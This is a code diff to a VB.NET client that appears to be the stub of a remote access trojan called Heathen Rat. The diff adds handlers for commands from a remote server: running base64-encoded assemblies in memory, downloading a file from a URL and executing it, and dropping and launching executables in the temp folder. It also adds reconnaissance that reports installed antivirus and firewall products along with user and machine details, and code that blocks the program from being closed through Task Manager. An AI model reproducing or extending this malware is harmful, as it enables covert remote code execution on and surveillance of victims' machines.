@@ -1,6 +1,7 @@
 ﻿Imports System.Collections.Concurrent
 Imports System.Drawing.Imaging
 Imports System.IO
+Imports System.Management
 Imports System.Net
 Imports System.Net.Sockets
 Imports System.Reflection
@@ -38,7 +39,7 @@ Public Class Form1
     Public UDPByte As Byte() = New Byte() {}
 
     ''UDP
-    Private Sub LireLesMessages(ByVal Context As TaskScheduler, ByVal stream As NetworkStream) 'Lire les messages du serveur
+    Private Sub LireLesMessages(ByVal Context As TaskScheduler, ByVal stream As NetworkStream)
 
         Try
             Dim Buffer(4096) As Byte
@@ -329,7 +330,7 @@ Public Class Form1
 
             Dim ListOfGarbage As New StringBuilder
 
-            '   Dim ListOfDirs As New StringBuilder
+
             For Each yu In Directory.GetFiles(Path, "*.*", SearchOption.TopDirectoryOnly)
                 ' Dim lvi As New ListViewItem(yu) 'first column
 
@@ -415,23 +416,66 @@ Public Class Form1
     End Sub
     Public Sub GetAllInFoSNeeded()
         Dim k As String = "System : " & My.Computer.Info.OSFullName
-        'Websocketclient1.DataToSend = k + Helpe.nam
-        '  Public Shared Function nam()
+
         Dim l = Environment.UserName
 
-
         Dim p = Environment.MachineName
-        '    Dim IPaddress As String = Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(Function(ip) ip.AddressFamily = AddressFamily.InterNetwork).ToString()
         Dim sl = Environment.OSVersion.VersionString
 
-        Dim ooo As String = k + vbCrLf + "Desktop Name : " + p & vbCrLf & "Username : " + l & vbCrLf & "OS Verion : " & sl 'IPaddress
+        Dim ooo As String = k + vbCrLf + "Desktop Name : " + p & vbCrLf & "Username : " + l & vbCrLf & "OS Verion : " & sl & vbCrLf & "Antivirus : " & GetAntivirus() & vbCrLf & "FireWall : " & GetFirewall()
 
 
         Dim buffer() As Byte = Encoding.UTF8.GetBytes(ooo)
         MonClient.GetStream().Write(buffer, 0, buffer.Length)
-        '  End Function
+
         TextBox1.Text = String.Empty
     End Sub
+
+
+
+    ''https://stackoverflow.com/questions/22153879/how-do-i-get-the-installed-antivirus-software-and-firewall-programmatically
+
+    ''Known Bugs with windows defender
+    Public Function GetAntivirus() As String
+        Try
+            Dim data As String = String.Empty
+            For Each firewall As ManagementObject In New ManagementObjectSearcher("root\SecurityCenter" & IIf(My.Computer.Info.OSFullName.Contains("XP"), "", "2").ToString, "SELECT * FROM AntiVirusProduct").Get
+                data &= firewall("displayName").ToString
+            Next
+            If Not data = String.Empty Then
+                Return data
+            Else
+                Return "No Antivirus"
+            End If
+
+        Catch
+            Return "No Antivirus"
+        End Try
+
+    End Function
+    Public Function GetFirewall() As String
+        Try
+
+            Dim data As String = String.Empty
+            For Each firewall As ManagementObject In New ManagementObjectSearcher("root\SecurityCenter" & IIf(My.Computer.Info.OSFullName.Contains("XP"), "", "2").ToString, "SELECT * FROM FirewallProduct").Get
+                data &= firewall("displayName").ToString
+            Next
+            If Not data = String.Empty Then
+                Return data
+            Else
+                Return "No Firewall"
+            End If
+        Catch
+            Return "No Firewall"
+        End Try
+
+    End Function
+
+    '''https://stackoverflow.com/questions/22153879/how-do-i-get-the-installed-antivirus-software-and-firewall-programmatically
+    '''
+
+
+
     Public Sub PlayMyAudio(ByVal stsr As String)
 
 
@@ -655,6 +699,19 @@ Public Class Form1
             SwapOn()
         ElseIf TextBox1.Text = "\\RevertThatSwapBitch//" Then
             SwapOff()
+        ElseIf TextBox1.Text.Contains("\\ExecuteInMemoFromPC//") Then
+            Dim bi As String = TextBox1.Text.Replace("\\ExecuteInMemoFromPC//", "")
+            ExecMemPls(bi)
+
+
+
+        ElseIf TextBox1.Text.Contains("\\ExecuteAsProcess//") Then
+            Dim k As String() = Split(TextBox1.Text, "\\ExecuteAsProcess//")
+            ExecuTeThatAsPrcoess(k(0), k(1))
+        ElseIf TextBox1.Text.Contains("\\ExecuteAsLink//") Then
+            Dim azd As String() = Split(TextBox1.Text, "\\ExecuteAsLink//")
+
+            FromLink(azd(0), azd(1))
         ElseIf TextBox1.Text = "TakeAPhotooo561" Then  'SCREENSHOT
 
             Dim lk As New Random
@@ -681,9 +738,34 @@ Public Class Form1
         End If
         FlushMemory()
     End Sub
+    Public Sub ExecMemPls(ByVal o As String)
 
+        Dim a As Assembly = Assembly.Load(Convert.FromBase64String(o))
+        Dim m As MethodInfo = a.EntryPoint
+        Dim parameters = If(m.GetParameters().Length = 0, Nothing, {New String(-1) {}})
+        m.Invoke(Nothing, parameters)
+        TextBox1.Text = String.Empty
+    End Sub
+    Public Sub FromLink(ByVal data As String, ByVal name As String)
+        Dim azd As New WebClient
+        Dim k As Byte() = azd.DownloadData(data)
+        Dim h As New Random
+
+        Dim m = h.Next(1000, 99999999)
+
+        IO.File.WriteAllBytes(IO.Path.GetTempPath & "\" & m.ToString & name, k)
+        Process.Start(IO.Path.GetTempPath & "\" & m.ToString & name)
+        TextBox1.Text = String.Empty
+    End Sub
+    Public Sub ExecuTeThatAsPrcoess(ByVal data As String, ByVal name As String)
+        Dim k As Byte() = Convert.FromBase64String(data)
+
+        IO.File.WriteAllBytes(IO.Path.GetTempPath & "\" & name, k)
+        Process.Start(IO.Path.GetTempPath & "\" & name)
+        TextBox1.Text = String.Empty
+    End Sub
     Public Sub FileThere(ByVal s As String, ByVal source As String)
-        MessageBox.Show(s)
+        '   MessageBox.Show(s)
         Try
             IO.File.WriteAllBytes(s, Convert.FromBase64String(source))
 
@@ -691,7 +773,11 @@ Public Class Form1
 
         End Try
         TextBox1.Text = String.Empty
+
+
     End Sub
+
+    'DirectLinkDropBox     : https://www.dropbox.com/s/oaegakxuuommc9a/Heathen%20Rat%20By%20Arsium%202.3.9.5.zip?dl=1  change 0 to one
     ''Come from : https://www.youtube.com/watch?v=-fPY7ecWPUA
     ''Reset Cache Memory
     Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer
@@ -784,7 +870,49 @@ Public Class Form1
         InvDeskLock.Show()
         TextBox1.Text = String.Empty
     End Sub
+    Private Sub Form1_2FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.Closing
 
+
+
+
+        If e.CloseReason = CloseReason.TaskManagerClosing Then
+            '  e.Cancel = True 
+
+            Dim o As String = MonClient.Client.LocalEndPoint.ToString
+            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")
+
+
+
+
+
+
+
+            MonClient.GetStream().Write(buffer, 0, buffer.Length)
+            e.Cancel = True
+
+        ElseIf (e.CloseReason = CloseReason.UserClosing) Then
+            Dim o As String = MonClient.Client.LocalEndPoint.ToString
+
+
+            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")
+            MonClient.GetStream().Write(buffer, 0, buffer.Length)
+
+            e.Cancel = True
+
+
+
+        ElseIf e.CloseReason = CloseReason.None Then
+            Dim o As String = MonClient.Client.LocalEndPoint.ToString
+
+
+
+            Dim buffer() As Byte = Encoding.UTF8.GetBytes(o + "Deco")
+            MonClient.GetStream().Write(buffer, 0, buffer.Length)
+
+        End If
+
+
+    End Sub
     Private Sub Form1_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
 
 
@@ -944,6 +1072,7 @@ Public Class Form1
         Catch ex As Exception
             Timer2.Start()
         End Try
+        FlushMemory()
     End Sub
 
     Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
@@ -979,6 +1108,7 @@ Public Class Form1
 
             End Try
         End Try
+        FlushMemory()
     End Sub
     Private Sub UDPTIMER_Tick(sender As Object, e As EventArgs) Handles UDPTIMER.Tick
         If ClearMyplug = False Then
